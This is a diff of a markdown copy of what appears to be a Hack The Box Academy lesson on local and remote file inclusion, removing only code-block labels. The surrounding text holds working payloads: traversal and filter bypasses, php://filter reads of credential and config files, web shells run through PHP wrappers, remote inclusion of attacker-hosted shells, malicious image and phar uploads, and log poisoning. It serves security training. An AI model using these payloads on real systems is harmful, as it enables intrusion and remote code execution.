@@ -88,8 +88,6 @@ Such a file could be a dynamic header or different content based on the user-spe
 
 In `PHP`, we may use the `include()` function to load a local or a remote file as we load a page. If the `path` passed to the `include()` is taken from a user-controlled parameter, like a `GET` parameter, and `the code does not explicitly filter and sanitize the user input`, then the code becomes vulnerable to File Inclusion. The following code snippet shows an example of that:
 
-Code: php
-
 ```php
 if (isset($_GET['language'])) {
     include($_GET['language']);
@@ -104,8 +102,6 @@ Note: In this module, we will mostly focus on PHP web applications running on a 
 
 Just as the case with PHP, NodeJS web servers may also load content based on an HTTP parameters. The following is a basic example of how a GET parameter `language` is used to control what data is written to a page:
 
-Code: javascript
-
 ```javascript
 if(req.query.language) {
     fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
@@ -115,8 +111,6 @@ if(req.query.language) {
 ```
 
 As we can see, whatever parameter passed from the URL gets used by the `readfile` function, which then writes the file content in the HTTP response. Another example is the `render()` function in the `Express.js` framework. The following example shows uses the `language` parameter to determine which directory it should pull the `about.html` page from:
-
-Code: js
 
 ```js
 app.get("/about/:language", function(req, res) {
@@ -130,8 +124,6 @@ Unlike our earlier examples where GET parameters were specified after a (`?`) ch
 
 The same concept applies to many other web servers. The following examples show how web applications for a Java web server may include local files based on the specified parameter, using the `include` function:
 
-Code: jsp
-
 ```jsp
 <c:if test="${not empty param.language}">
     <jsp:include file="<%= request.getParameter('language') %>" />
@@ -139,8 +131,6 @@ Code: jsp
 ```
 
 The `include` function may take a file or a page URL as its argument and then renders the object into the front-end template, similar to the ones we saw earlier with NodeJS. The `import` function may also be used to render a local file or a URL, such as the following example:
-
-Code: jsp
 
 ```jsp
 <c:import url= "<%= request.getParameter('language') %>"/>
@@ -150,8 +140,6 @@ Code: jsp
 
 Finally, let's take an example of how File Inclusion vulnerabilities may occur in .NET web applications. The `Response.WriteFile` function works very similarly to all of our earlier examples, as it takes a file path for its input and writes its content to the response. The path may be retrieved from a GET parameter for dynamic content loading, as follows:
 
-Code: cs
-
 ```cs
 @if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
     <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
@@ -160,15 +148,11 @@ Code: cs
 
 Furthermore, the `@Html.Partial()` function may also be used to render the specified file as part of the front-end template, similarly to what we saw earlier:
 
-Code: cs
-
 ```cs
 @Html.Partial(HttpContext.Request.Query['language'])
 ```
 
 Finally, the `include` function may be used to render local files or remote URLs, and may also execute the specified files as well:
-
-Code: cs
 
 ```cs
 <!--#include file="<% HttpContext.Request.Query['language'] %>"-->
@@ -236,15 +220,11 @@ As we can see, the page is indeed vulnerable, and we are able to read the conten
 
 In the earlier example, we read a file by specifying its `absolute path` (e.g. `/etc/passwd`). This would work if the whole input was used within the `include()` function without any additions, like the following example:
 
-Code: php
-
 ```php
 include($_GET['language']);
 ```
 
 In this case, if we try to read `/etc/passwd`, then the `include()` function would fetch that file directly. However, in many occasions, web developers may append or prepend a string to the `language` parameter. For example, the `language` parameter may be used for the filename, and may be added after a directory, as follows:
-
-Code: php
 
 ```php
 include("./languages/" . $_GET['language']);
@@ -274,8 +254,6 @@ Tip: It can always be useful to be efficient and not add unnecessary `../` sever
 
 In our previous example, we used the `language` parameter after the directory, so we could traverse the path to read the `passwd` file. On some occasions, our input may be appended after a different string. For example, it may be used with a prefix to get the full filename, like the following example:
 
-Code: php
-
 ```php
 include("lang_" . $_GET['language']);
 ```
@@ -295,8 +273,6 @@ Note: This may not always work, as in this example a directory named `lang_/` ma
 ### Appended Extensions
 
 Another very common example is when an extension is appended to the `language` parameter, as follows:
-
-Code: php
 
 ```php
 include($_GET['language'] . ".php");
@@ -336,8 +312,6 @@ In the previous section, we saw several types of attacks that we can use for dif
 
 One of the most basic filters against LFI is a search and replace filter, where it simply deletes substrings of (`../`) to avoid path traversals. For example:
 
-Code: php
-
 ```php
 $language = str_replace('../', '', $_GET['language']);
 ```
@@ -376,8 +350,6 @@ You may refer to the [Command Injections](https://academy.hackthebox.com/module/
 
 Some web applications may also use Regular Expressions to ensure that the file being included is under a specific path. For example, the web application we have been dealing with may only accept paths that are under the `./languages` directory, as follows:
 
-Code: php
-
 ```php
 if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
     include($_GET['language']);
@@ -410,15 +382,11 @@ If we combine both of these PHP limitations together, we can create very long st
 
 An example of such payload would be the following:
 
-Code: url
-
 ```url
 ?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
 ```
 
 Of course, we don't have to manually type `./` 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:
-
-Basic Bypasses
 
 ```shell-session
 root@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
@@ -456,8 +424,6 @@ There are four different types of filters available for use, which are [String F
 ### Fuzzing for PHP Files
 
 The first step would be to fuzz for different available PHP pages with a tool like `ffuf` or `gobuster`, as covered in the [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) module:
-
-PHP Filters
 
 ```shell-session
 root@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
@@ -504,8 +470,6 @@ Note: We intentionally left the resource file at the end of our string, as the `
 
 As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier. We can now decode this string to get the content of the source code of `config.php`, as follows:
 
-PHP Filters
-
 ```shell-session
 root@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
 
@@ -541,8 +505,6 @@ The [data](https://www.php.net/manual/en/wrappers.data.php) wrapper can be used 
 
 To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where `X.Y` is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use the `base64` filter we used in the previous section, as `.ini` files are similar to `.php` files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:
 
-PHP Wrappers
-
 ```shell-session
 root@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
 <!DOCTYPE html>
@@ -558,8 +520,6 @@ root@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/
 
 Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value:
 
-PHP Wrappers
-
 ```shell-session
 root@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
 
@@ -574,8 +534,6 @@ With `allow_url_include` enabled, we can proceed with our `data` wrapper attack.
 
 So, our first step would be to base64 encode a basic PHP web shell, as follows:
 
-PHP Wrappers
-
 ```shell-session
 root@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
 
@@ -587,8 +545,6 @@ Now, we can URL encode the base64 string, and then pass it to the data wrapper w
 ![](https://academy.hackthebox.com/storage/modules/23/data\_wrapper\_id.png)
 
 We may also use cURL for the same attack, as follows:
-
-PHP Wrappers
 
 ```shell-session
 root@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
@@ -602,8 +558,6 @@ root@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://tex
 Similar to the `data` wrapper, the [input](https://www.php.net/manual/en/wrappers.php.php) wrapper can be used to include external input and execute PHP code. The difference between it and the `data` wrapper is that we pass our input to the `input` wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, the `input` wrapper also depends on the `allow_url_include` setting, as mentioned earlier.
 
 To repeat our earlier attack but with the `input` wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:
-
-PHP Wrappers
 
 ```shell-session
 root@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
@@ -620,16 +574,12 @@ Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expe
 
 However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did with `allow_url_include` earlier, but we'd `grep` for `expect` instead, and if it is installed and enabled we'd get the following:
 
-PHP Wrappers
-
 ```shell-session
 root@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
 extension=expect
 ```
 
 As we can see, the `extension` configuration keyword is used to enable the `expect` module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use the `expect://` wrapper and then pass the command we want to execute, as follows:
-
-PHP Wrappers
 
 ```shell-session
 root@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
@@ -676,8 +626,6 @@ Furthermore, as we may note in the above table, some functions do allow includin
 
 In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:
 
-Remote File Inclusion (RFI)
-
 ```shell-session
 root@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
 
@@ -698,8 +646,6 @@ Note: It may not be ideal to include the vulnerable page itself (i.e. index.php)
 
 The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:
 
-Remote File Inclusion (RFI)
-
 ```shell-session
 root@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
@@ -709,8 +655,6 @@ Now, all we need to do is host this script and include it through the RFI vulner
 ### HTTP
 
 Now, we can start a server on our machine with a basic python server with the following command, as follows:
-
-Remote File Inclusion (RFI)
 
 ```shell-session
 root@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
@@ -722,8 +666,6 @@ Now, we can include our local shell through RFI, like we did earlier, but using 
 ![](https://academy.hackthebox.com/storage/modules/23/rfi\_localhost.jpg)
 
 As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command:
-
-Remote File Inclusion (RFI)
 
 ```shell-session
 root@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
@@ -737,8 +679,6 @@ Tip: We can examine the connection on our machine to ensure the request is being
 ### FTP
 
 As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:
-
-Remote File Inclusion (RFI)
 
 ```shell-session
 root@htb[/htb]$ sudo python -m pyftpdlib -p 21
@@ -755,8 +695,6 @@ This may also be useful in case http ports are blocked by a firewall or the `htt
 
 As we can see, this worked very similarly to our http attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
 
-Remote File Inclusion (RFI)
-
 ```shell-session
 root@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
 ...SNIP...
@@ -768,8 +706,6 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
 
 We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
-
-Remote File Inclusion (RFI)
 
 ```shell-session
 root@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
@@ -819,8 +755,6 @@ Image upload is very common in most modern web applications, as uploading images
 
 Our first step is to create a malicious image containing a PHP web shell code that still looks and works as an image. So, we will use an allowed image extension in our file name (e.g. `shell.gif`), and should also include the image magic bytes at the beginning of the file content (e.g. `GIF8`), just in case the upload form checks for both the extension and content type as well. We can do so as follows:
 
-LFI and File Uploads
-
 ```shell-session
 root@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
 ```
@@ -836,8 +770,6 @@ Now, we need to upload our malicious image file. To do so, we can go to the `Pro
 **Uploaded File Path**
 
 Once we've uploaded our file, all we need to do is include it through the LFI vulnerability. To include the uploaded file, we need to know the path to our uploaded file. In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL. In our case, if we inspect the source code after uploading the image, we can get its URL:
-
-Code: html
 
 ```html
 <img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
@@ -861,8 +793,6 @@ As mentioned earlier, the above technique is very reliable and should work in mo
 
 We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:
 
-LFI and File Uploads
-
 ```shell-session
 root@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
 ```
@@ -883,8 +813,6 @@ Note: We added the uploads directory (`./profile_images/`) before the file name,
 
 Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
 
-Code: php
-
 ```php
 <?php
 $phar = new Phar('shell.phar');
@@ -896,8 +824,6 @@ $phar->stopBuffering();
 ```
 
 This script can be compiled into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with. We can compile it into a `phar` file and rename it to `shell.jpg` as follows:
-
-LFI and File Uploads
 
 ```shell-session
 root@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
@@ -947,8 +873,6 @@ We can see that the session file contains two values: `page`, which shows the se
 
 Let's try setting the value of `page` a custom value (e.g. `language parameter`) and see if it changes in the session file. We can do so by simply visiting the page with `?language=session_poisoning` specified, as follows:
 
-Code: url
-
 ```url
 http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
 ```
@@ -958,8 +882,6 @@ Now, let's include the session file once again to look at the contents:
 ![](https://academy.hackthebox.com/storage/modules/23/lfi\_poisoned\_sessid.png)
 
 This time, the session file contains `session_poisoning` instead of `es.php`, which confirms our ability to control the value of `page` in the session file. Our next step is to perform the `poisoning` step by writing PHP code to the session file. We can write a basic PHP web shell by changing the `?language=` parameter to a URL encoded web shell, as follows:
-
-Code: url
 
 ```url
 http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
@@ -997,8 +919,6 @@ As expected, our custom User-Agent value is visible in the included log file. No
 
 We may also poison the log by sending a request through cURL, as follows:
 
-Log Poisoning
-
 ```shell-session
 root@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
 ```
@@ -1031,8 +951,6 @@ The HTML forms users can use on the web application front-end tend to be properl
 
 The [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) module goes into details on how we can fuzz for `GET`/`POST` parameters. For example, we can fuzz the page for common `GET` parameters, as follows:
 
-Automated Scanning
-
 ```shell-session
 root@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
 
@@ -1063,8 +981,6 @@ Tip: For a more precise scan, we can limit our scan to the most popular LFI para
 So far in this module, we have been manually crafting our LFI payloads to test for LFI vulnerabilities. This is because manual testing is more reliable and can find LFI vulnerabilities that may not be identified otherwise, as discussed earlier. However, in many cases, we may want to run a quick test on a parameter to see if it is vulnerable to any common LFI payload, which may save us time in web applications where we need to test for various vulnerabilities.
 
 There are a number of [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) we can use for this scan. A good wordlist is [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt), as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the `?language=` parameter we have been testing throughout the module, as follows:
-
-Automated Scanning
 
 ```shell-session
 root@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
@@ -1108,8 +1024,6 @@ To do so, we can fuzz for the `index.php` file through common webroot paths, whi
 
 The following is an example of how we can do all of this with ffuf:
 
-Automated Scanning
-
 ```shell-session
 root@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
 
@@ -1136,8 +1050,6 @@ As we can see, the scan did indeed identify the correct webroot path at (`/var/w
 As we have seen in the previous section, we need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).
 
 To do so, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:
-
-Automated Scanning
 
 ```shell-session
 root@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
@@ -1170,8 +1082,6 @@ ________________________________________________
 
 As we can see, the scan returned over 60 results, many of which were not identified with the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, which shows us that a precise scan is important in certain cases. Now, we can try reading any of these files to see whether we can get their content. We will read (`/etc/apache2/apache2.conf`), as it is a known path for the apache server configuration:
 
-Automated Scanning
-
 ```shell-session
 root@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
 
@@ -1185,8 +1095,6 @@ root@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../et
 ```
 
 As we can see, we do get the default webroot path and the log path. However, in this case, the log path is using a global apache variable (`APACHE_LOG_DIR`), which are found in another file we saw above, which is (`/etc/apache2/envvars`), and we can read it to find the variable values:
-
-Automated Scanning
 
 ```shell-session
 root@htb[/htb]$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
@@ -1245,8 +1153,6 @@ The best way to prevent directory traversal is to use your programming language'
 If you create your own function to do this method, it is possible you are not accounting for a weird edge case. For example, in your bash terminal, go into your home directory (cd \~) and run the command `cat .?/.*/.?/etc/passwd`. You'll see Bash allows for the `?` and `*` wildcards to be used as a `.`. Now type `php -a` to enter the PHP Command Line interpreter and run `echo file_get_contents('.?/.*/.?/etc/passwd');`. You'll see PHP does not have the same behaviour with the wildcards, if you replace `?` and `*` with `.`, the command will work as expected. This demonstrates there is an edge cases with our above function, if we have PHP execute bash with the `system()` function, the attacker would be able to bypass our directory traversal prevention. If we use native functions to the framework we are in, there is a chance other users would catch edge cases like this and fix it before it gets exploited in our web application.
 
 Furthermore, we can sanitize the user input to recursively remove any attempts of traversing directories, as follows:
-
-Code: php
 
 ```php
 while(substr_count($input, '../', 0)) {
